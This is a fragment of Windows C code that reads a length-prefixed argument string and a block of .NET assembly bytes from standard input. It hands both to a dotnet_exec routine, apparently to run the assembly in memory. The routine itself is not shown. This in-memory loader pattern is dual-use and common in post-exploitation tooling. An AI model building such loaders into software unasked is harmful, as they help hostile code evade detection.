    HANDLE hIn = GetStdHandle(STD_INPUT_HANDLE);
    BYTE   hdr[4];
    DWORD  rd, off;

    off = 0;
    while (off < 4) {
        rd = 0;
        if (!ReadFile(hIn, hdr + off, 4 - off, &rd, NULL) || rd == 0) ExitProcess(1);
        off += rd;
    }
    DWORD args_len = (DWORD)hdr[0] | ((DWORD)hdr[1]<<8) | ((DWORD)hdr[2]<<16) | ((DWORD)hdr[3]<<24);

    char *args_str = (char*)calloc(args_len + 1, 1);
    if (!args_str) ExitProcess(1);
    off = 0;
    while (off < args_len) {
        rd = 0;
        if (!ReadFile(hIn, args_str + off, args_len - off, &rd, NULL) || rd == 0) ExitProcess(1);
        off += rd;
    }

    off = 0;
    while (off < 4) {
        rd = 0;
        if (!ReadFile(hIn, hdr + off, 4 - off, &rd, NULL) || rd == 0) ExitProcess(1);
        off += rd;
    }
    DWORD asm_len = (DWORD)hdr[0] | ((DWORD)hdr[1]<<8) | ((DWORD)hdr[2]<<16) | ((DWORD)hdr[3]<<24);

    uint8_t *asm_bytes = (uint8_t*)malloc(asm_len);
    if (!asm_bytes) ExitProcess(1);
    off = 0;
    while (off < asm_len) {
        rd = 0;
        if (!ReadFile(hIn, asm_bytes + off, asm_len - off, &rd, NULL) || rd == 0) ExitProcess(1);
        off += rd;
    }

    dotnet_exec(asm_bytes, asm_len, args_str, 1); // calls ExitProcess(0) on completion
    ExitProcess(0);
}
